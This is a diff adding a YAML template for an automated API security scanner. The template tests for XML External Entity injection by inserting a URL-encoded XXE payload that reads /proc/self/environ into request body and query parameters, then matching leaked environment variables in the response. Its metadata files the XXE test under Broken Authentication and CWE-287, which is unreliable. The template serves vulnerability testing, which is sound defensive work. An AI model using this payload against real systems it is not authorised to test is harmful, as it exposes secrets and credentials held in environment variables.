@@ -1,0 +1,124 @@
+id: XXE_READ_ENV_VAR
+info:
+  name: "XML External Entity (XXE) test for reading Environment Variables"
+  description: >
+    "This test involves exploiting XML parsing vulnerabilities to extract sensitive environment variable data, potentially exposing critical information within the target system."
+  details: >
+    "This test leverages XML parsing weaknesses to intercept and disclose crucial environmental data, offering insights into the system's configuration and potential avenues for further exploitation."
+  impact: >
+    "Successful XML External Entity (XXE) test for reading Environment Variables can result in the unauthorized retrieval of sensitive system information, potentially exposing confidential data and creating avenues for subsequent security threats."
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: XXE_READ_ENV_VAR
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  method:
+    contains_either:
+      - POST
+      - PUT
+      - PATCH
+  or:
+    - request_payload:
+        for_one:
+          key:
+            regex: .*
+            extract: changed_body_key
+    - query_param:
+        for_one:
+          key:
+            regex: .*
+            extract: changed_query_key
+wordLists:
+  payloads:
+    - "%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fproc%2Fself%2Fenviron%22%3E%5D%3E%3Cuser%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fuser%3E"
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_body_param: 
+            changed_body_key:  ${payloads}
+        - modify_query_param: 
+            changed_query_key:  ${payloads}
+validate:
+  response_payload:
+    regex: "(\\w+=[^\\s]+)(?:\\s+\\w+=[^\\s]+)*"
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+
